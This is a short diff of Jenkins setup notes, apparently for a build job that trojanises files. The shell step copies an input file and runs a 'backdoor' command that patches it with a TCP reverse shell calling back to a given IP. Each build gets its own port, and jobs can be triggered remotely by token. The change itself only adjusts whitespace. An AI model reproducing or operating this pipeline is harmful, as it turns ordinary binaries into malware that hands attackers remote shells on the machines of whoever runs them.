@@ -21,7 +21,7 @@ Jenkins configuration:
 		2: Check allow simotaius builds
 		3: Set allow remote triggred with a token
 		4: Build shell with following:
-			```rp=$(expr 1024 + $BUILD_NUMBER) #make it a port that is non-reserved and non-taken, should exclude 8080 and a few others
+```rp=$(expr 1024 + $BUILD_NUMBER) #make it a port that is non-reserved and non-taken, should exclude 8080 and a few others
 echo $rp
 cp /in/$dir .
 backdoor -f $dir -P $rp -H $IP -s reverse_shell_tcp
